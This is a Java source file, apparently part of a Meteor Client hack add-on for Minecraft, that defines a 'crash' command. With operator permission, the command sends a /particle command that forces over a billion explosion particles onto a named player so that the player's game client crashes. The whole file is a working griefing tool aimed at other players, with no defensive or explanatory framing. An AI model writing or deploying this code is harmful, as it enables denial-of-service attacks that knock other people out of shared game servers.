package uwu.taxevasion.allahhack.commands;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.systems.commands.Command;
import meteordevelopment.meteorclient.systems.commands.arguments.PlayerArgumentType;
import net.minecraft.command.CommandSource;

import static com.mojang.brigadier.Command.SINGLE_SUCCESS;

public class CrashCommand extends Command {
    public CrashCommand() {
        super("crash", "crashes a player (needs op)", "crash", "ripbozo");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(argument("player", PlayerArgumentType.player()).executes(context -> {
            if (mc.player.hasPermissionLevel(4)) {
                mc.player.sendChatMessage("/particle explosion ~ ~ ~ 1 1 1 0.01 1333333337 force " + PlayerArgumentType.getPlayer(context).getEntityName());
            }
            return SINGLE_SUCCESS;
        }));
    }
}
